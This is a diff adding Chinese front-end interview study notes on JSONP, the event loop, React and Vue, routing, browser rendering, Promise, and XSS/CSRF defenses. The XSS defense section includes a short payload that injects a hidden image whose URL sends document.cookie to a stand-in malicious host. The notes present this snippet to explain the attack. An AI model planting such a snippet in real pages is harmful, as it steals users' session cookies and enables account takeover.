@@ -785,9 +785,295 @@ arr = [...arrLike]
 
 如果server超时未响应，认为网络能力下降，重设慢启动阀值
 
+##### JSONP
 
+```javascript
+function jsonpCallback(result) {  
+        //alert(result);  
+        for(var i in result) {  
+            alert(i+":"+result[i]);//循环输出a:1,b:2,etc.  
+        }  
+    }  
+    var JSONP=document.createElement("script");  
+    JSONP.type="text/javascript";  
+    JSONP.src="http://crossdomain.com/services.php?callback=jsonpCallback";  
+    document.getElementsByTagName("head")[0].appendChild(JSONP); 
+```
 
+##### [内存泄露——闭包](https://segmentfault.com/q/1010000000414875)
 
+不可控的东西才会造成内存泄露
 
+```javascript
+function bindEvent() 
+{ 
+    var obj = document.createElement("XXX"); 
+    obj.onclick = function(){ 
+        // ... 
+    } 
+}
 
+bindEvent();
+```
+
+##### 事件循环
+
+不管是同步还是异步，都有事件列队和主线程。异步动作操作完就会像事件列队放事件。然后主线程昨晚自己手头的事就回去看列队，再继续做。
+
+除了setTimeout和setInterval这两个方法，Node.js还提供了另外两个与"任务队列"有关的方法：[process.nextTick](http://nodejs.org/docs/latest/api/process.html#process_process_nexttick_callback)和[setImmediate](http://nodejs.org/docs/latest/api/timers.html#timers_setimmediate_callback_arg)。它们可以帮助我们加深对"任务队列"的理解。
+
+process.nextTick方法可以在当前"执行栈"的尾部----下一次Event Loop（主线程读取"任务队列"）之前----触发回调函数。也就是说，它指定的任务总是发生在所有异步任务之前。setImmediate方法则是在当前"任务队列"的尾部添加事件，也就是说，它指定的任务总是在下一次Event Loop时执行，这与setTimeout(fn, 0)很像。
+
+### [摘自很好的一个面经](https://github.com/Meheal/front-end-interview-questions)
+
+##### 职业规划
+
+1. 首先应该是一个优秀的程序员
+2. 其次是努力使自己成为某一领域的技术专家
+3. 通过技术更好的服务于团队和业务
+4. 提高沟通能力，团队协作，发现问题，解决问题，总结问题能力
+5. 写写博客，输出就是最好的学习
+6. 提升个人前端的工作效率和工作质量
+7. 关注前端前言技术和发展方向，通过新技术服务团队和业务
+8. 一专多长
+
+想成为优秀的前端工程师，首先在专业技能领域必不可少，其次在团队贡献、业务思索、价值判断上也有要求。这三方面能决定你的专业技能能够为公司产出多大的价值。
+
+我觉得程序员最核心的竞争力是学习力和责任。 学习能力的源泉就是好奇心，也就是对新知识的渴求，以及对探索未知的冲动。
+
+#####  你希望加入一个什么样的团队
+
+- 对前端开发有激情
+- 能够持之以恒的学习
+- 团队做事方式是否规范（代码规范，安全规范，流程规范）
+- 团队有足够的成长空间，对自己有个清晰的定位。
+- 团队认可我的价值
+
+##### 单页面应用的优缺点
+
+优点： 1.用户体验好，快，内容的改变不需要重新加载整个页面 2.基于上面一点，SPA相对服务器压力小 3.没有页面切换，就没有白屏阻塞
+
+缺点： 1、不利于SEO 2、初次加载耗时增多 3、导航不可用 4、容易造成css命名冲突等 5、页面复杂度提高很多，复杂逻辑难度成倍
+
+为什么不利于SEO？
+
+SPA简单流程 蜘蛛无法执行JS，相应的页面内容无从抓取
+
+```
+<html data-ng-app=”app”>是其标志性的标注。
+
+```
+
+对于这种页面来说，很多都是采用js等搜索引擎无法识别的技术来做的
+
+##### 打包原理
+
+webpack打包，最基本的实现方式，是将所有的模块代码放到一个数组里，通过数组ID来引用不同的模块
+
+```
+/************************************************************************/
+/******/ ([
+/* 0 */
+/***/ function(module, exports, __webpack_require__) {
+
+    __webpack_require__(1);
+    __webpack_require__(2);
+    console.log('Hello, world!');
+
+/***/ },
+/* 1 */
+/***/ function(module, exports) {
+
+    var a = 'a.js';
+    console.log("I'm a.js");
+
+/***/ },
+/* 2 */
+/***/ function(module, exports) {
+
+    var b = 'b.js';
+    console.log("I'm b.js");
+
+/***/ }
+/******/ ]);
+```
+
+可以发现入口entry.js的代码是放在数组索引0的位置，其它a.js和b.js的代码分别放在了数组索引1和2的位置，而webpack引用的时候，主要通过`__webpack_require__`的方法引用不同索引的模块。
+
+##### react和vue的区别
+
+1.函数式编程vs js、html、css分开
+
+2.单向绑定 vs 双向绑定
+
+3.更改model层，react要用setState（脏状态更新），vue直接改（侵入式绑定响应）。
+
+4.virtual DOM 不一样 vue会跟踪每一个组件的依赖关系，不需要重新渲染整个组件树。而对于React而言，每当应用的状态被改变时，全部子组件都会重新渲染。当然，这可以通过shouldComponentUpdate这个生命周期方法来进行控制
+
+##### 为什么要用虚拟dom
+
+虚拟DOM厉害的地方并不是说它比 DOM 快（这句话本来就是错的），而是说不管你数据怎么变化，我都可以以最小的代价来更新 DOM。方法就是我在内存里面用新的数据刷新一个虚拟的 DOM 树，然后新旧 DOM 树进行比较，找出差异，再更新到真正的 DOM 树上。
+
+##### vue 虚拟DOM和react 虚拟DOM的区别
+
+在渲染过程中，会跟踪每一个组件的依赖关系，不需要重新渲染整个组件树。而对于React而言，每当应用的状态被改变时，全部子组件都会重新渲染。 在 React 应用中，当某个组件的状态发生变化时，它会以该组件为根，重新渲染整个组件子树。 如要避免不必要的子组件的重新渲染，你需要在所有可能的地方使用 PureComponent，或是手动实现`shouldComponentUpdate` 方法
+
+在React中，数据流是自上而下单向的从父节点传递到子节点，所以组件是简单且容易把握的，子组件只需要从父节点提供的props中获取数据并渲染即可。如果顶层组件的某个prop改变了，React会递归地向下遍历整棵组件树，重新渲染所有使用这个属性的组件。
+
+##### 两种实现前端路由的方式
+
+HTML5 History两个新增的API：history.pushState 和 history.replaceState，两个 API 都会操作浏览器的历史记录，而不会引起页面的刷新。
+
+Hash就是url 中看到 # ,我们需要一个根据监听哈希变化触发的事件( hashchange) 事件。我们用 window.location 处理哈希的改变时不会重新渲染页面，而是当作新页面加到历史记录中，这样我们跳转页面就可以在 hashchange 事件中注册 ajax 从而改变页面内容。 可以为hash的改变添加监听事件：
+
+```
+window.addEventListener("hashchange", funcRef, false)
+
+```
+
+- 优点
+
+从性能和用户体验的层面来比较的话，后端路由每次访问一个新页面的时候都要向服务器发送请求，然后服务器再响应请求，这个过程肯定会有延迟。而前端路由在访问一个新页面的时候仅仅是变换了一下路径而已，没有了网络延迟，对于用户体验来说会有相当大的提升。
+
+前端路由的优点有很多，比如页面持久性，像大部分音乐网站，你都可以在播放歌曲的同时，跳转到别的页面而音乐没有中断，再比如前后端彻底分离。 开发一个前端路由，主要考虑到页面的可插拔、页面的生命周期、内存管理等。
+
+- 缺点
+
+使用浏览器的前进，后退键的时候会重新发送请求，没有合理地利用缓存。
+
+History interface提供了两个新的方法：`pushState()`, `replaceState()`使得我们可以对浏览器历史记录栈进行修改：
+
+```
+window.history.pushState(stateObject, title, URL)
+window.history.replaceState(stateObject, title, URL)
+```
+
+##### 浏览器渲染原理解析
+
+1、首先渲染引擎下载HTML，解析生成DOM Tree
+
+2、遇到css标签或JS脚本标签就新起线程去下载他们，并继续构建DOM。（其中css是异步下载同步执行）浏览器引擎通过 DOM Tree 和 CSS Rule Tree 构建 Rendering Tree
+
+3、 通过 CSS Rule Tree 匹配 DOM Tree 进行定位坐标和大小，这个过程称为 Flow 或 Layout 。
+
+4、最终通过调用Native GUI 的 API 绘制网页画面的过程称为 Paint 。
+
+当用户在浏览网页时进行交互或通过 js 脚本改变页面结构时，以上的部分操作有可能重复运行，此过程称为 Repaint 或 Reflow。 重排是指dom树发生结构变化后，需要重新构建dom结构。 重绘是指dom节点样式改变，重新绘制。 重排一定会带来重绘，重绘不一定有重排。
+
+如何减少浏览器重排：将需要多次重排的元素，position属性设为absolute或fixed，这样此元素就脱离了文档流，它的变化不会影响到其他元素。
+
+##### fetch和Ajax有什么不同
+
+`XMLHttpRequest` 是一个设计粗糙的 API，不符合关注分离（Separation of Concerns）的原则，配置和调用方式非常混乱，而且基于事件的异步模型写起来也没有现代的 Promise，`generator/yield`，`async/await` 友好。
+
+fetch 是浏览器提供的一个新的 web API，它用来代替 Ajax（XMLHttpRequest），其提供了更优雅的接口，更灵活强大的功能。 Fetch 优点主要有：
+
+- 语法简洁，更加语义化
+- 基于标准 Promise 实现，支持 `async/await`
+
+```
+fetch(url).then(response => response.json())
+  .then(data => console.log(data))
+  .catch(e => console.log("Oops, error", e))
+```
+
+##### http2.0和https
+
+与HTTP/1相比，主要区别包括
+
+- HTTP/2采用二进制格式而非文本格式（二进制协议解析起来更高效）
+- HTTP/2是完全多路复用的，即一个TCP连接上同时跑多个HTTP请求
+- 使用报头压缩，HTTP/2降低了开销
+- HTTP/2让服务器可以将响应主动“推送”到客户端缓存中，支持服务端推送（就是服务器可以对一个客户端请求发送多个响应）
+
+##### 浏览器输入 url 之后敲下回车，刷新 F5 与强制刷新(Ctrl + F5)，又有什么区别？
+
+实际上浏览器输入 url 之后敲下回车就是先看本地 cache-control、expires 的情况，刷新(F5)就是忽略先看本地 cache-control、expires 的情况，带上条件 If-None-Match、If-Modified-Since，强制刷新(Ctrl + F5)就是不带条件的访问
+
+##### babel的原理
+
+使用 babylon 解析器对输入的源代码字符串进行解析并生成初始 AST 遍历 AST 树并应用各 transformers（plugin） 生成变换后的 AST 树 利用 babel-generator 将 AST 树输出为转码后的代码字符串 分为三个阶段：
+
+解析：将代码字符串解析成抽象语法树 变换：对抽象语法树进行变换操作 再建：根据变换后的抽象语法树再生成代码字符串
+
+##### Promise实现原理
+
+现在回顾下Promise的实现过程，其主要使用了设计模式中的观察者模式：
+
+- 通过`Promise.prototype.then`和`Promise.prototype.catch`方法将观察者方法注册到被观察者Promise对象中，同时返回一个新的Promise对象，以便可以链式调用。
+- 被观察者管理内部pending、fulfilled和rejected的状态转变，同时通过构造函数中传递的resolve和reject方法以主动触发状态转变和通知观察者。
+
+`Promise.then()`是异步调用的，这也是Promise设计上规定的，其原因在于同步调用和异步调用同时存在会导致混乱。
+
+为了暂停当前的 promise，或者要它等待另一个 promise 完成，只需要简单地在 then() 函数中返回另一个 promise。
+
+Promise 也有一些缺点。首先，无法取消 Promise，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，Promise 内部抛出的错误，不会反应到外部。第三，当处于 Pending 状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。
+
+一般来说，不要在then方法里面定义Reject状态的回调函数（即then的第二个参数），总是使用catch方法，理由是更接近同步的写法。 then的第二个函数参数和catch等价
+
+##### 前端渲染的优势
+
+- 局部刷新。无需每次都进行完整页面请求
+- 懒加载。如在页面初始时只加载可视区域内的数据，滚动后rp加载其它数据，可以通过 react-lazyload 实现
+- 富交互。使用 JS 实现各种酷炫效果
+- 节约服务器成本。省电省钱，JS 支持 CDN 部署，且部署极其简单，只需要服务器支持静态文件即可
+- 天生的关注分离设计。服务器来访问数据库提供接口，JS 只关注数据获取和展现
+- JS 一次学习，到处使用。可以用来开发 Web、Serve、Mobile、Desktop 类型的应用
+
+##### 服务端渲染的优势
+
+- 更好的 SEO，由于搜索引擎爬虫抓取工具可以直接查看完全渲染的页面。
+- 服务端渲染不需要先下载一堆 js 和 css 后才能看到页面（首屏性能）
+- 服务端渲染不用关心浏览器兼容性问题（随意浏览器发展，这个优点逐渐消失）
+- 对于电量不给力的手机或平板，减少在客户端的电量消耗很重要
+
+#### XSS和CSRF 防御
+
+XSS和CSRF都属于跨站攻击，XSS是实现CSRF诸多途径中的一条，但不是唯一一条
+
+xss的本质是让对方浏览器执行你插入的js ，来获取cookie等信息；csrf是借用用户的身份，向服务器发送请求
+
+XSS分为存储型和反射型：
+
+- 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等
+- 反射型XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS
+
+##### XSS防范：
+
+1）客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行
+
+- 移除用户上传的DOM属性，如onerror等
+- 移除用户上传的style节点，script节点，iframe节点等 2）对用户输入的代码标签进行转换（html encode） 3）对url中的参数进行过滤 4）对动态输出到页面的内容进行HTML编码 5）服务端对敏感的Cookie设置 httpOnly属性，使js脚本不能读取到cookie
+
+1. CSP 即是 Content Security Policy
+
+```
+var img = document.createElement('img');
+img.src='http://www.xss.com?cookie='+document.cookie;
+img.style.display='none';
+document.getElementsByTagName('body')[0].appendChild(img);
+
+这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。
+```
+
+目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的`<script>`标签，这段脚本很明显就是一段xss攻击向量，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。可以在浏览器中将这个拦截关闭
+
+##### 跨站请求伪造的过程与防范：
+
+[http://www.imooc.com/article/13552](http://www.imooc.com/article/13552)
+
+过程：用户小明在你的网站A上面登录了，A返回了一个session ID（使用cookie存储）,小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址，小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求，通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。
+
+1）使用token：服务器随机产生tooken，然后以tooken为秘钥产生一段密文，把token和密文都随cookie交给前端，前端发起请求时把密文和token交给后端，后端对token和密文进行验证，看token能不能生成同样的密文，这样即使黑客拿到了token也无法拿到密文
+
+```
+http://www.weibo.cn?follow_uid=123&token=73ksdkfu102
+
+```
+
+2）使用验证码：每一个重要的post提交页面，使用一个验证码，因为第三方网站是无法获得验证码的
+
+3）检测http的头信息refer。Referer记录了请求的来源地址，服务器要做的是验证这个来源地址是否合法
+
+4）涉及敏感操作的请求改为POST请求
 
